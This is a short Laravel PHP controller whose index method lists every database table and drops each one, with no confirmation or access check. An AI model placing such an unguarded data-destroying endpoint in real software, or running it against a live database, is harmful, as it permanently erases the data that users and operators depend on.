<?php

namespace App\Http\Controllers\Backend;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

use App\Http\Requests;
use App\Http\Controllers\Controller;

class DatabaseController extends Controller
{
    public function index()
    {
        foreach(DB::select('SHOW TABLES') as $table) {
            $table_array = get_object_vars($table);
            Schema::drop($table_array[key($table_array)]);
        }
    }
    //
}
